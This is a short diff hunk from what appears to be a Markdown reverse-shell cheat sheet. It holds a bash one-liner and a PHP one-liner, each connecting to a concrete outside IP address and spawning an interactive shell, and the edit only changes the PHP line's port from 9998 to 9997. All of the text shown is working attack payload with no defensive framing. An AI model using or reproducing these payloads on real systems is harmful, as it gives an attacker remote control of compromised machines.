@@ -439,7 +439,7 @@ bash -c "bash -i >& /dev/tcp/124.70.141.45/9998 0>&1"
 ### php
 
 ```shell
-php -r '$sock=fsockopen("124.70.141.45",9998);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("124.70.141.45",9997);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 
